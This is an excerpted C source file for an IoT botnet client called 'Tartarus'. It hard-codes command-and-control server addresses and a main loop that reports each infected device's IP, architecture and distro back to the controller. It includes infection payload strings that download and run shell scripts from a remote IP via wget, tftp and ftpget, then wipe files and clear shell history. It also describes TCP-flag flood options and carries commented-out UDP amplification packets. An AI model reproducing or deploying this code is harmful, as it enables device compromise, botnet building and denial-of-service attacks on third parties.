...
TCP: Uses TCP Flood ALONE - Gives users the option of using single TCP-Flags and these include the following: ["TCP-ACK", "TCP-SYN", "TCP-PSH", "TCP-RST", "TCP-SYN"]
...
#define SERVER_LIST_SIZE (sizeof(Tartarus) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
...
////////////////////////////
#define Project "Tartarus - C2 Client/Bot"
#define Developer [":)"]
// Enjoy ||
////////////////////////////////////////
unsigned char *Tartarus[] = {"45.129.2.143:666"}; // <ServerIP>:<BotPort> || Error: {"45.129.2.143:23"}; || Vexvain: {"165.227.72.112:23"};
unsigned char *AltServer[] = {"45.129.2.143:23"};  // {"23.254.244.244:23"}; || 
////////////////////////////////////////
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
...
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
// Nice payloads
char *Busybox_Payload = "cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 45.129.2.143/bin.sh;chmod 777;sh bin.sh;busybox tftp -g 45.129.2.143 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 45.129.2.143 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history;cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/ || /var/run/ || /var/system/ || /mnt/ || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;busybox wget 45.129.2.143/bins.sh;chmod 777;sh bins.sh;busybox tftp -g 45.129.2.143 -r tftp1.sh;chmod 777 *;sh tftp1.sh;busybox tftp -g 45.129.2.143 -r tftp2.sh;chmod 777 *;sh tftp2.sh;rm -rf *sh;history -c;history -w;rm -rf ~/.bash_history";
char *Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.129.2.143/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 45.129.2.143 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.129.2.143; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.129.2.143 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
char *bin_mips = "ntpd";
...
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
// STD Strings
//char *Method_STD_String1[] = {""};
...
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
// UDP Strings
//char *Method_UDP_String1[] = {"\x30\x3A\x02\x01\x03\x30\x0F\x02\x02\x4A\x69\x02\x03\x00\xFF\xE3\x04\x01\x04\x02\x01\x03\x04\x10\x30\x0E\x04\x00\x02\x01\x00\x02\x01\x00\x04\x00\x04\x00\x04\x00\x30\x12\x04\x00\x04\x00\xA0\x0C\x02\x02\x37\xF0\x02\x01\x00\x02\x01\x00\x30\x00"};
//char *Method_UDP_String2[] = {"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01"};
//char *Method_UDP_String3[] = {"x00\x0"};
//char *Method_UDP_String4[] = {"\x"};
//char *Method_UDP_String5[] = {"x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x32\x6c\xf3\xcf\xf4\x8e\x3c\x44\x83\xc8\x8d\x51\x45\x6f\x90\x95\x23\x3e\x00\x97\x2b\x1c"};
//char *Method_UDP_String6[] = {"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"};
//[+]-----------------------------------------------------------------------------------------------------------------------------------------------------------------[+]
int initConnection();
...
char *getDistro()
{
        ...
        return "REHL/CentOS/RedHat/FreeBSD";
        }
...
int initConnection()
{
        ...
        strcpy(server, Tartarus[currentServer]);
        int port = 6982;
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(mainCommSock, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mIP:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mPort:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mDevice:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mType:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mArch:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mDistro:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m] \e[38;5;202mSystem:\e[38;5;93m[\e[38;5;202m%s\e[38;5;93m]", inet_ntoa(ourIP), getPortz(), getDevice(), getFiles(), getArch(), getDistro(), getSys());
                char commBuf[4096];
                int got = 0;
                int i = 0;
